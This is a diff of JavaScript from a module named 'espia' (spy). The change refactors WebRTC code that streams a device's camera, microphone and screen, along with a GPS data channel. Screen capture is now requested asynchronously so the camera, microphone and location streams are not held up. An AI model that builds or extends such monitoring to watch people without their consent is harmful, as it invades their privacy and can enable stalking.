@@ -10860,20 +10860,9 @@
                         console.warn('[espia] getUserMedia solo audio también fallo:', e.message);
                     }
                 }
-                // [v2.7.17] 2) Pantalla — feature-detect getDisplayMedia (iOS Safari <17 no lo tiene)
-                if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
-                    try {
-                        _espiaCli.streams.display = await navigator.mediaDevices.getDisplayMedia({
-                            video: { frameRate: { ideal: 15 } }, audio: false
-                        });
-                        console.log('[espia] screen OK');
-                    } catch(e) {
-                        console.warn('[espia] getDisplayMedia fallo:', e.message);
-                    }
-                } else {
-                    console.log('[espia] getDisplayMedia no disponible (iOS Safari <17?) — sin captura pantalla');
-                }
-                if (!_espiaCli.streams.userMedia && !_espiaCli.streams.display) {
+                // [v2.7.21 REFACTOR] pantalla NO se pide aquí - async sin bloquear.
+                // Antes await getDisplayMedia bloqueaba 30s+ esperando user gesture.
+                if (!_espiaCli.streams.userMedia) {
                     await _espiaCliCerrar('sin_streams');
                     return;
                 }
@@ -10884,16 +10873,41 @@
                     ]
                 });
                 _espiaCli.pc = pc;
-                // 4) Agregar tracks
+                // 4) Agregar tracks cam+mic
                 if (_espiaCli.streams.userMedia) {
                     _espiaCli.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, _espiaCli.streams.userMedia));
                 }
-                if (_espiaCli.streams.display) {
-                    _espiaCli.streams.display.getTracks().forEach(t => pc.addTrack(t, _espiaCli.streams.display));
-                    // Si el user detiene compartir pantalla, no cerramos toda la sesión
-                    _espiaCli.streams.display.getTracks().forEach(t => {
-                        t.onended = () => console.log('[espia] track screen terminado por user');
-                    });
+                // [v2.7.21] Transceiver reservado para pantalla
+                let displayTransceiver = null;
+                try {
+                    displayTransceiver = pc.addTransceiver('video', { direction: 'sendonly' });
+                    _espiaCli._displayTransceiver = displayTransceiver;
+                } catch(eT) { console.warn('[espia] no se pudo reservar transceiver pantalla:', eT.message); }
+                // [v2.7.21] getDisplayMedia ASYNC sin bloquear el flow principal
+                if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+                    (async () => {
+                        try {
+                            console.log('[espia] solicitando pantalla async (no bloquea cam/mic/GPS)...');
+                            const screen = await navigator.mediaDevices.getDisplayMedia({
+                                video: { frameRate: { ideal: 15 } }, audio: false
+                            });
+                            _espiaCli.streams.display = screen;
+                            const tracks = screen.getVideoTracks();
+                            console.log('[espia] pantalla obtenida · tracks:', tracks.length, 'displaySurface:', tracks[0]?.getSettings?.()?.displaySurface);
+                            if (displayTransceiver && tracks[0]) {
+                                await displayTransceiver.sender.replaceTrack(tracks[0]);
+                                console.log('[espia] pantalla agregada al transceiver · sin renegociación ✓');
+                                tracks[0].onended = () => {
+                                    console.log('[espia] user detuvo compartir pantalla');
+                                    try { displayTransceiver.sender.replaceTrack(null); } catch(_){}
+                                };
+                            }
+                        } catch(eS) {
+                            console.warn('[espia] getDisplayMedia rechazado/falló:', eS.message);
+                        }
+                    })();
+                } else {
+                    console.log('[espia] getDisplayMedia no disponible (iOS Safari <17?)');
                 }
                 // 5) DataChannel GPS
                 const gpsCh = pc.createDataChannel('gps');
